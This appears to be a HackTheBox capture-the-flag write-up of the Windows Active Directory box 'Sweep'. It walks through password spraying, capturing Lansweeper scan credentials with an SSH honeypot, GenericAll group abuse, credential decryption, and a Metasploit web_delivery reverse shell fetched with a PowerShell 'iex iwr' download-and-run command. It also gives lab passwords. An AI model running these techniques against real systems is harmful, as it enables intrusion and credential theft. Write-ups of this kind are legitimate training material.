# [HackTheBox - Sweep](https://app.hackthebox.com/machines/Sweep)
![ca14eb20774b9369201705b525de8cdb.png](/resources/ca14eb20774b9369201705b525de8cdb.png)
## Table of Contents

- [Abstract](#abstract)
- [Enumeration](#enumeration)
- [Obtain svc_inventory_lnx credential via Lansweeper credentialed scan](#obtain-svc_inventory_lnx-credential-via-lansweeper-credentialed-scan)
- [Initial Access with GenericAll to a Lansweeper Admins group](#initial-access-with-genericall-to-a-lansweeper-admins-group)
- [Privilege Escalation with Lansweeper credential in configuration](#privilege-escalation-with-lansweeper-credential-in-configuration)
- [Intended path - Shell as SYSTEM via Lansweeper deployment](#intended-path-shell-as-system-via-lansweeper-deployment)

***
## Abstract
Sendai is a vulnlab machine imported to HackTheBox as a medium Windows Active Directory box, I started with network enumeration with nmap, revealing this machine is a domain controller and has Lansweeper website running on port 81 and 82.

On the enumeration phase, I found that guest account is enabled and can be used to pull user list. Which I conduct password spraying attack with "user:user" combination which reveals that "intern" user have its username as a password and can be used to login into the Lansweeper.

Lansweeper have 2 credentials configured for the inventory scanning which I used sshesame to host SSH honeypot to capture the SSH credential sent from Lansweeper to autheticate to linux host which I obtained  "svc_inventory_lnx" user from this method.

The bloodhound result shows that "svc_inventory_lnx" is in the group that have GenericAll over Lansweeper Admins group which is a member of Remote Management Users group so I added "svc_inventory_lnx" to this group and get a foothold on target.

There are 2 methods that can be used for privielge escalation
- The intended way is to login into the Lansweeper again with "svc_inventory_lnx" account and deploy a package with "svc_inventory_win" credential configured to scan for Windows host which I used metasploit to get a reverse shell as SYSTEM.
- The unintended way is to decrypt Lansweeper configuration file that contains encrypted credential of "svc_inventory_win" user which is a member of Administrators group so I used [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)  to get the credential root the box.

## Enumeration
I start with nmap scan without any flag to quickly scan for well-known port which reveals that this machine is a domain controller and there are services running on port 81 and 82.
![2866ef8960ab0367c8ba709269096084.png](/resources/2866ef8960ab0367c8ba709269096084.png)

I rerun nmap scan again but this time with `-sCV` flag for service enumeration and nmap script engine, which I discovered the hostname here and found that port 81 and 82 are running the website (http and https) and it is hosting [Lansweeper](https://www.lansweeper.com/lp/tech-asset-intelligence/?gad_campaignid=12985088361) the IT discovery & inventory platform.
![77af5aa2e4047a502ccd69730a990270.png](/resources/77af5aa2e4047a502ccd69730a990270.png)

Since this is the domain controller, I start by enumerating SMB and LDAP next with null session and guest user which I found that null session can not be used here but guest account is enabled and it can access to `DefaultPackageShare$`.
```
nxc smb sweep.vl -u 'guest' -p '' --shares --users
```
![523359c817f1465bfc792cf639d4411f.png](/resources/523359c817f1465bfc792cf639d4411f.png)

I check the files inside the `DefaultPackageShare$` share which I found couble of files but nothing useful here.
```
smbclient \\\\sweep.vl\\DefaultPackageShare$ -N
```
![00f157057ec68bba4814024630e10a7d.png](/resources/00f157057ec68bba4814024630e10a7d.png)

Since guest account is enabled and can connect to shares then I use RID cycling method with NetExec to create user list and I can use this list to conduct password spraying attack when I obtained user password later.
```
nxc smb sweep.vl -u 'guest' -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users
```
![932d5417345c425019a6af975c0b2ae4.png](/resources/932d5417345c425019a6af975c0b2ae4.png)

But since I don't have any password to work on yet so I tried with the simple combination `user:user` which I found that "intern" user using the same password as its username.
```
nxc smb sweep.vl -u users -p users --no-bruteforce --continue-on-success
```
![115e03235a91bcbf070dfaca66cccf93.png](/resources/115e03235a91bcbf070dfaca66cccf93.png)

Using the intern credential, another non-default share is opened to me and it is `Lansweeper$` share and this likely to be the share folder associated with Lansweeper.
```
nxc smb sweep.vl -u intern -p intern --shares
```
![c1897baada6aa1569b8386b8385b3b61.png](/resources/c1897baada6aa1569b8386b8385b3b61.png)

But I did not find anything useful here.
![c0b1e86f5a55a47be6cd67fc5fae9471.png](/resources/c0b1e86f5a55a47be6cd67fc5fae9471.png)

But since I already obtained valid domain user, I use rusthound to collect domain information that can be used for lateral movement to another user and potentially gain initial access.
```
rusthound-ce -d sweep.vl -u intern@sweep.vl -p intern -z
```
![e619762abef879ccb004e559328a2d3d.png](/resources/e619762abef879ccb004e559328a2d3d.png)

After let Bloodhound analyze the relationship between each objects, we can see that "intern" is just a user that can not do anything so I will have to find another way to get the foothold
![2959196e579a8c1735ade467424bfa54.png](/resources/2959196e579a8c1735ade467424bfa54.png)

## Obtain svc_inventory_lnx credential via Lansweeper credentialed scan
Without any option left, I open Lansweeper site on port 82 which revealing the login page for lansweeper. 
![80385ca7ce23acf55b84faa509312154.png](/resources/80385ca7ce23acf55b84faa509312154.png)

I use `intern:intern` as a credential to login and look like the intern can access Lansweeper but with limited functionality.
![137014cff85e8f6144bf44eaff6da6df.png](/resources/137014cff85e8f6144bf44eaff6da6df.png)

Lansweeper have a [Scanning](https://www.lansweeper.com/resources/lansweeper-scanning-guide/) feature that can be used to scan various of things for asset inventory which we can navigate to this feature by clicking "Scanning" and we can see that it can even scan with credential as well. which we can see that on the "Scanning credentials", "svc_inventory_lnx" user's credential was set to scan for Linux inventory via SSH and "svc_inventory_win" user's credential was set to scan for Windows inventory.
![13fd12323c82d0b006662c8eb0077db1.png](/resources/13fd12323c82d0b006662c8eb0077db1.png)

By clicking edit credential, we can see that it use user and password to authenticate to Linux host to scan for Linux inventory. unfortunately that we can not click to reveal its password here. 
![95cd83b62259a3be438df3f66e1b4188.png](/resources/95cd83b62259a3be438df3f66e1b4188.png)

But in fact, we can create a SSH honeypot to accept the SSH credential that will be sent to authenticate to Linux host so I create a new scanning target and select target type to "IP Range"
![9f2299326366337315e6912deaa323f2.png](/resources/9f2299326366337315e6912deaa323f2.png)

Now I have to specify my IP address that will be used to capture SSH credential and since TCP port 22 traffic to player VPN tunnel IPs is blocked in HTB labs then I changed the SSH port to 222 as well.
![06d90cbf56bfc2ade177781b92b92d97.png](/resources/06d90cbf56bfc2ade177781b92b92d97.png)

After creating a new target, We should be able to see its configuration like this.
![6288ce0c224f3edca7eaa78529a6756b.png](/resources/6288ce0c224f3edca7eaa78529a6756b.png)

To be able to make this scan a credentialed scan, I need to map the credential to the new target here and after mapping "Inventory Linux" credential to our host then what left is to host the SSH honeypot to capture SSH credential.  
![0d709b2b3c5c20b1df8bf1ed4f7188c5.png](/resources/0d709b2b3c5c20b1df8bf1ed4f7188c5.png)

I use [sshesame](https://github.com/jaksi/sshesame) to setup and host SSH honeypot on my machine and we can easily install and download example config file to make an adjustment ourselves with only 3 commands.
```
sudo apt install sshesame
wget https://raw.githubusercontent.com/jaksi/sshesame/refs/heads/master/sshesame.yaml
mv sshesame.yaml sshesame.conf
```

Now we need to change the listening server address and port in `sshesame.conf` which I will use this in my config file. 
```
server:
  listen_address: 10.10.14.24:222
```

But once I start running sshesame, I trigged an error as shown in the image below and we need to comment out a single line from our config file.
```
sshesame --config sshesame.conf
```
![f149de86c53a08097a91a9f67e1e44b7.png](/resources/f149de86c53a08097a91a9f67e1e44b7.png)

Command this line (line 37) out and we should be able to host SSH honeypot with sshesame without any error now.
![722e5ad7cf282e894d29239361071fc8.png](/resources/722e5ad7cf282e894d29239361071fc8.png)
![6ce226210b51a13d2ca212fadf9d59df.png](/resources/6ce226210b51a13d2ca212fadf9d59df.png)

Now I go back to the Lansweeper to launch the scan.
![f5d719de972e447251b844d34ffc6eb7.png](/resources/f5d719de972e447251b844d34ffc6eb7.png)

Now we have credential of "svc_inventory_lnx" user
![05db73add3e286c13fba9a231a9021b9.png](/resources/05db73add3e286c13fba9a231a9021b9.png)

This credential is valid but it can not be used to gain a foothold right away so I need to check outbound object control from this user to other objects.
![0c159f440e57b37db1b6b9ce4d27d0b8.png](/resources/0c159f440e57b37db1b6b9ce4d27d0b8.png)

## Initial Access with GenericAll to a Lansweeper Admins group 

Outbound object control of the "svc_inventory_lnx" user, I found that this user is the member of "Lansweeper Discovery" group which have "GenericAll" right on "Lansweeper Admins" group and the "Lansweeper Admins" group is a member of "Remote Management Users" group and thats mean I can add  "svc_inventory_lnx" user to "Lansweeper Admins" group and I can foothold on the domain controller with via WinRM.
![f1eb65b23e47c2ad666ed548cd1090fb.png](/resources/f1eb65b23e47c2ad666ed548cd1090fb.png)

There are multiple ways to add users to a group remotely which I use bloodyAD for this and now I should be able to get a foothold as "svc_inventory_lnx" user.
```
bloodyAD --host "10.129.234.177" -d "sweep.vl" -u 'svc_inventory_lnx' -p '0|5m-U6?/uAX' add groupMember "Lansweeper Admins" "svc_inventory_lnx"
```
![df185c441af99a22b3909a42aa998699.png](/resources/df185c441af99a22b3909a42aa998699.png)
![26fb48c417007ad7efd0f9ddff633349.png](/resources/26fb48c417007ad7efd0f9ddff633349.png)

By using evil-winrm, I can now get a foothold and loot user flag located on root folder of C drive here.
```
evil-winrm -i sweep.vl -u 'svc_inventory_lnx' -p '0|5m-U6?/uAX'
```
![ed75dcb46519842134dd1d2ee3758001.png](/resources/ed75dcb46519842134dd1d2ee3758001.png)

## Privilege Escalation with Lansweeper credential in configuration 

I keep exploring the bloodhound graph to find any interesting relationship which I found that "svc_inventory_win" user is a member of Administrators group and as we already discovered that the credential of this user was also configured in Lansweeper as well.
![9851d0d14461311157babc99aaeb0641.png](/resources/9851d0d14461311157babc99aaeb0641.png)

Lansweeper keep its config file in `web.config` file as shown in the image below and it also encrypted the password of each credential as well.
![0ba67db35cd65396e6c5d6c2b8026f58.png](/resources/0ba67db35cd65396e6c5d6c2b8026f58.png)

There is a tool hat can be used to automatically extract and decrypt all configured scanning credentials of a Lansweeper instance and that tool is [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt) which I download PowerShell script from here and execute it which reveals the password of all credentials configured in this lansweeper instance.
```
upload LansweeperDecrypt.ps1
.\LansweeperDecrypt.ps1
```
![046ebe5aa629b4d4e87c7511af2803eb.png](/resources/046ebe5aa629b4d4e87c7511af2803eb.png)

Confirming that this password can be used, I conduct password spraying attack again and we can see that I finally have the administrator account as displayed with "Pwn3d!" by NetExec tool
```
nxc smb sweep.vl -u users -p '4^56!sK&}eA?'
```
![48038251bfd4610be6e2803f77e467b5.png](/resources/48038251bfd4610be6e2803f77e467b5.png)

At this moment I can use any tool I want to access the domain controller either as Administrator or SYSTEM, loot the root flag and root the box. :D
```
evil-winrm -i sweep.vl -u svc_inventory_win -p '4^56!sK&}eA?
```
![f4ed87b007ebc8c106abbef8cea9538c.png](/resources/f4ed87b007ebc8c106abbef8cea9538c.png)

https://labs.hackthebox.com/achievement/machine/1438364/695
***
## Intended path - Shell as SYSTEM via Lansweeper deployment
After finishing the box, I read the write-up made by [0xdf](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html#via-lansweeper-deployment) which reveals that I can use lansweeper to get a shell as SYSTEM via lansweeper deployment as well and this is the intended path for this box as well.
![e8aaaa0a538531f69d347e5e80a9c0f5.png](/resources/e8aaaa0a538531f69d347e5e80a9c0f5.png)

I login into Lansweeper with "svc_inventory_lnx" user again and we can see that this account can deploy package as "svc_inventory_lnx" user is Lansweeper Admins
![dd876fa97fe356c09c425dece3ddb850.png](/resources/dd876fa97fe356c09c425dece3ddb850.png)

I select one of the package that will execute command upon deployment which I can edit this with my reverse shell command and get a shell as SYSTEM.
![c39d5be177a39128c2fb1b3c86616c39.png](/resources/c39d5be177a39128c2fb1b3c86616c39.png)

First, I'll setup web delivery module in metesploit framework to host powershell reverse shell payload.
```
use exploit/multi/script/web_delivery
set target 2
set payload windows/x64/meterpreter/reverse_tcp
set lhost tun0
set lport 443
run
```
![ba1a1cac7cbbab558aa5051c32bf94e9.png](/resources/ba1a1cac7cbbab558aa5051c32bf94e9.png)

But after I pasted the payload from metasploit, it can not be used due to 1000 character limit.
![95910e919a43c9b6aa903af3783d1ba0.png](/resources/95910e919a43c9b6aa903af3783d1ba0.png)

To solve this problem, I create `shell.ps1` file with the content from metasploit and then use this simple reverse shell command which I'm familiar with from various of clickfix investigation.
```
powershell -ep bypass -c "iex (iwr -useb 'http://10.10.14.24/shell.ps1')"
```
![055d2853b19b8e895ddbc425ff45ece6.png](/resources/055d2853b19b8e895ddbc425ff45ece6.png)

After edit the "step", I also select Run mode as "Scanning credentials" as well so it will be executed with credential of "svc_inventory_win" user.
![2d953afe4f8d2ab99e7ae02be26e7722.png](/resources/2d953afe4f8d2ab99e7ae02be26e7722.png)

Do not forget to map the credential here as well.
![1ea171b58530e0bb9a03586d2cc49799.png](/resources/1ea171b58530e0bb9a03586d2cc49799.png)

Lastly, I go back to the deployment package again to deploy the package which will execute the reverse shell command I set.
![1fd4e0c93e02688aa5ecec67d69e21f8.png](/resources/1fd4e0c93e02688aa5ecec67d69e21f8.png)

Now I have a shell as SYSTEM and root the box with intended way.
![ce6edd9aa8fe4bc2936bd5a5277b4b25.png](/resources/ce6edd9aa8fe4bc2936bd5a5277b4b25.png)
![dd0e34421731e0df7765fb833cd5346a.png](/resources/dd0e34421731e0df7765fb833cd5346a.png)
* * *